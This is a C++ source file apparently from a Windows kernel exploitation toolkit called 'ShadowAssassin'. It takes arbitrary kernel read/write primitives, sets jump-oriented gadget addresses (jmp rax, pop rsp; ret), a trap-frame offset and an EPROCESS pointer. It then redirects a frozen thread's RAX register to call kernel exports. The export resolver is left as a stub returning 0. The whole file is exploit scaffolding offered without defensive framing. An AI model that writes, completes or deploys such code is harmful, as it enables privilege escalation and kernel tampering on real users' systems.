#include "shadowassassin.h"


// --- Setup ---

ShadowAssassin::ShadowAssassin()
    : gadgetJmpRax(0), gadgetPopRspRet(0), scratchAddress(0)
{}

void ShadowAssassin::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn)  { readFn  = fn; }
void ShadowAssassin::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn)          { writeFn = fn; }
void ShadowAssassin::SetGadgetJmpRax(UINT64 offset)     { gadgetJmpRax    = offset; }
void ShadowAssassin::SetGadgetPopRspRet(UINT64 offset)  { gadgetPopRspRet = offset; }
void ShadowAssassin::SetScratchAddress(UINT64 addr)     { scratchAddress  = addr;   }

void ShadowAssassin::SetTrapFrameOffset(UINT64 offset) {
    frameManager.SetTrapFrameOffset(offset);
}

void ShadowAssassin::SetEPROCESS(UINT64 ep) {
    frameManager.SetEPROCESS(ep);
}

FrameManager& ShadowAssassin::GetFrameManager() { return frameManager; }
JOPManager&   ShadowAssassin::GetJOPManager()   { return jopManager;   }


bool ShadowAssassin::Initialize() {
    if (!readFn || !writeFn) {
        DbgLog("[ShadowAssassin::Initialize] FAIL: readFn=%d writeFn=%d\n",
            (bool)readFn, (bool)writeFn);
        return false;
    }

    frameManager.SetReadPrimitive(readFn);
    frameManager.SetWritePrimitive(writeFn);

    DbgLog("[ShadowAssassin::Initialize] OK: primitives wired\n");
    return true;
}


// --- Kernel export resolution ---

UINT64 ShadowAssassin::ResolveKernelExport(const std::string& name) {
    return 0;
}


// --- Syscall dispatch ---

UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UINT64>& params) {
    if (!gadgetJmpRax || !gadgetPopRspRet) {
        DbgLog("[CallSyscall] FAIL: gadgets not set (jmpRax=0x%llX popRspRet=0x%llX)\n",
            gadgetJmpRax, gadgetPopRspRet);
        return 0;
    }

    UINT64 funcAddr = ResolveKernelExport(name);
    if (!funcAddr) {
        DbgLog("[CallSyscall] FAIL: ResolveKernelExport returned 0 for '%s'\n", name.c_str());
        return 0;
    }
    DbgLog("[CallSyscall] Resolved '%s' -> 0x%llX\n", name.c_str(), funcAddr);

    frameManager.CreateFrozenThread();

    UINT64 frameBase = frameManager.GetFrameAddress();
    if (!frameBase) {
        DbgLog("[CallSyscall] FAIL: frameBase is 0 after CreateFrozenThread\n");
        return 0;
    }
    DbgLog("[CallSyscall] frameBase=0x%llX\n", frameBase);

    frameManager.WriteRegister("rax", funcAddr);

    frameManager.ContinueThread();
    DbgLog("[CallSyscall] Thread continued, returning funcAddr=0x%llX\n", funcAddr);
    return funcAddr;
}
